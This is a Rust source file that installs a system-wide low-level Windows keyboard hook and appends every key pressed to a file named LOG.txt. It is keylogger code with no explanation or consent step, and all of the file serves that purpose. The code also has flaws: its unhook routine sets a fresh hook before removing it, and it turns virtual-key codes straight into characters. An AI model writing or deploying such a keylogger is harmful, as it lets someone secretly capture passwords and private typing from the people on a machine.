use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{SetWindowsHookExA,CallNextHookEx,WH_KEYBOARD_LL,WM_KEYDOWN,
    KBDLLHOOKSTRUCT,UnhookWindowsHookEx,GetMessageA,TranslateMessage,DispatchMessageA};
use std::fs::{OpenOptions, File};
use std::io::Write;

pub fn call_hook(){
    let hook = set_keyboard_hook();
    message_loop(hook);
}

pub fn unhook()-> Option<i32>{

    let hook = set_keyboard_hook();

    let un_hook =unsafe{ UnhookWindowsHookEx(hook) };

    if un_hook == 0 {
        None
    }else{
        Some(un_hook)
    }
}

fn message_loop(hook:HHOOK){
    
    let mut msg = winapi::um::winuser::MSG {
        hwnd: std::ptr::null_mut(),
        message: 0,
        wParam: 0,
        lParam: 0,
        time: 0,
        pt: winapi::shared::windef::POINT { x: 0, y: 0 },
    };
    
    loop {
        let ret = unsafe{ GetMessageA(&mut msg, std::ptr::null_mut(), 0, 0) };
        if ret == 0 || ret == -1 {
            break;
        }
    
        unsafe{ TranslateMessage(&mut msg) };
        unsafe{ DispatchMessageA(&mut msg) };
    }

}

fn set_keyboard_hook()-> HHOOK{

    let hook = unsafe {
        SetWindowsHookExA(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            std::ptr::null_mut(),
            0,
        )
    };

    if hook.is_null() {
        panic!("Failed to set keyboard hook")
    }else{
        hook
    }

}

extern "system" fn hook_callback(code: i32, w_param: usize, l_param: isize) -> isize {

    let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
        Ok(file) => file,
        Err(e) => File::create("LOG.txt").unwrap()
    };

    if w_param as u32 == WM_KEYDOWN {
        let kb_struct: &KBDLLHOOKSTRUCT = unsafe { &*(l_param as *const KBDLLHOOKSTRUCT) };

        let char_written = char::from_u32((*kb_struct).vkCode).unwrap();
        
        write!(&mut file,"{}",char_written).unwrap();
    }

    unsafe { CallNextHookEx(std::ptr::null_mut(), code, w_param, l_param) }
}